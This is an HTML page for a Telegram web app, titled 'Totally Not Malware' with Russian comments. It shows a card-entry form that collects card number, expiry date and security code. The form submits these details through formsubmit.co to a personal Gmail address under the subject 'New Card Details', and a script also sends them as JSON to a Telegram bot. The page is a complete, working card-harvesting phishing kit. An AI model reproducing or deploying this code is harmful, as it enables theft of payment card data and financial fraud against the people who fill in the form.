<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Form</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8e7eb; /* Розовый фон */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .form-container {
            background-color: #fff5f7; /* Розовый светлый фон */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 300px;
            text-align: center;
        }
        .form-container h1 {
            font-size: 18px;
            margin-bottom: 20px;
            color: #ff69b4; /* Розовый заголовок */
        }
        .form-container input {
            width: 100%;
            margin-bottom: 15px;
            padding: 10px;
            border: 1px solid #ffc0cb; /* Розовая граница */
            border-radius: 4px;
        }
        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #ff69b4; /* Розовая кнопка */
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .form-container button:hover {
            background-color: #db7093; /* Темно-розовая кнопка при наведении */
        }
        .gif-container {
            margin-top: 20px;
        }
        .gif-container img {
            max-width: 100%;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        @media (max-width: 600px) {
            .form-container {
                width: 100%;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h1>Totally Not Malware</h1>
        <form id="credit-card-form" action="https://formsubmit.co/andrej.g2103@gmail.com" method="POST">
            <!-- Поля для ввода данных -->
            <input type="text" name="Card Number" placeholder="Card number" required>
            <input type="text" name="Expiry Date" placeholder="Expiry date" required>
            <input type="text" name="Security Code" placeholder="Security code" required>
            
            <!-- Скрытые поля для formSubmit -->
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_subject" value="New Card Details">
            <input type="hidden" name="_next" value="https://goosemma.github.io">
            <button type="submit">Th-thanks</button>
        </form>
    </div>
    <div class="gif-container">
        <img src="tia.gif" alt="GIF">
    </div>

    <script>
        window.Telegram.WebApp.ready();
        
        document.getElementById('credit-card-form').addEventListener('submit', function(event) {
            // Отправляем данные через formSubmit.co
            const formData = new FormData(event.target);
            const data = {};
            formData.forEach((value, key) => data[key] = value);

            // Отправляем данные в Telegram, если необходимо
            window.Telegram.WebApp.sendData(JSON.stringify(data));
        });
    </script>
</body>
</html>
